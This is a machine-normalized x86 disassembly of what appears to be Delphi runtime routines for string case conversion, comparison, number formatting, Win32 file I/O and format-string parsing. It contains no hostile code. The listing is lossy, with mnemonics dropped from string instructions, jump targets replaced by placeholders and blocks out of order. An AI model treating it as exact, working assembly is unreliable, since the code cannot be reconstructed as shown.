mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
pop edi
pop esi
pop ebx
retn
sub_407910
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b04
mov eax esi
pop esi
pop ebx
retn
sub_407930
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_40795c
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407930
pop ebx
retn
sub_407994
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40416c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044f8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_4079d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40416c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044f8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407a0c
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407a3c
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407a5c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407ab0
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407a5c
test eax eax
jne r-xdata
sub_407ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40416c
push eax
mov eax esi
call sub_40436c
push eax
mov eax ebx
call sub_40416c
push eax
mov eax ebx
call sub_40436c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40416c
push eax
mov eax esi
call sub_40436c
push eax
mov eax ebx
call sub_40416c
push eax
mov eax ebx
call sub_40436c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407b5c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407b7c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40416c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403eac
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4043cc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407bcc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40416c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40416c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407c30
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407c46
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407c46
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407c46
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407c7c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407c30
mov edx esi
pop eax
call sub_403f9c
add esp 0x10
pop esi
retn
sub_407c9c
or cl cl
jne sub_407cd0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407cd0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407cd0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407cd0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d68
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407c9c
mov edx esi
pop eax
call sub_403f9c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407d90
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407c30
mov edx esi
pop eax
call sub_403f9c
add esp 0x20
pop esi
retn
xor edx edx
sub_407db8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b24
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_4078ec
sub_407e0c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b24
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407e2c
mov eax [ rw-data ]
call sub_404c74
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404c74
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e30
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f00
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e30
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f00
sub_407ebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407b44
test al al
je r-xdata
sub_407ef8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4090cc
mov edx eax
test dl dl
je r-xdata
call sub_407e2c
push ebp
mov eax [ rw-data ]
call sub_404c7c
mov edx eax
mov eax [ rw-data ]
call sub_407ebc
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404c7c
mov edx eax
mov eax [ rw-data ]
call sub_407ebc
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_407f94
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f00
call sub_407e2c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f00
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f00
jmp r-xdata
pop esi
pop ebx
retn
sub_407fe0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40436c
push eax
call CreateFileA
sub_408038
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40436c
push eax
call CreateFileA
pop ebx
retn
sub_408064
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408090
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4080bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4080fc
push ebx
push esi
mov esi eax
mov eax esi
call sub_40416c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bb74
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40812c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40416c
mov edi eax
mov eax ebx
call sub_40436c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4083e8
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bb74
cmp al 0x2
jne r-xdata
dec edi
sub_40817c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40812c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4043cc
pop edi
pop esi
pop ebx
retn
sub_4081b4
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40436c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403f9c
add esp 0x108
pop esi
pop ebx
retn
sub_4081f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c50
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c50
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4082a0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4082c8
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4082fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40416c
push eax
mov eax ebx
call sub_40436c
mov edx eax
mov eax esi
pop ecx
call sub_4082c8
pop esi
pop ebx
retn
sub_408320
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
mov edx eax
mov ecx edi
mov eax ebx
call sub_4082c8
pop edi
pop esi
pop ebx
retn
sub_408340
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408364
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4083a4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4083fc
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408484
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408264
mov esi eax
inc esi
mov eax esi
call sub_408464
mov ecx esi
mov edx ebx
call sub_408290
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4084c0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bb98
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408290
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_4078ec
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408548
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40889f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40862a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408672
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40862a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40853c
pop edx
or edx edx
je r-xdata
sub_40862a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40889f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408672
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40889f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4084c0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408699 ]
mov ebx ecx
sub cl 0x44
je sub_407c9c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4040d4
jmp r-xdata
mov esi sub_404134
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407c9c
sub cl 0x44
je sub_407c30
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407c30
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407c9c
mov ecx 0x10
cmp bl 0x58
je sub_407c30
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408518
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408a58
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407c30
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_4088c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408264
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408548
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408900
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408264
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408548
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408954
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40416c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40416c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40416c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408548
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403f9c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403eac
mov eax esi
mov edx ebx
call sub_4044f8
mov eax [ ebp - 0x4 ]
call sub_40416c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408548
mov edx esi
xchg edx eax
call sub_4044f8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408a14
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408a58
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
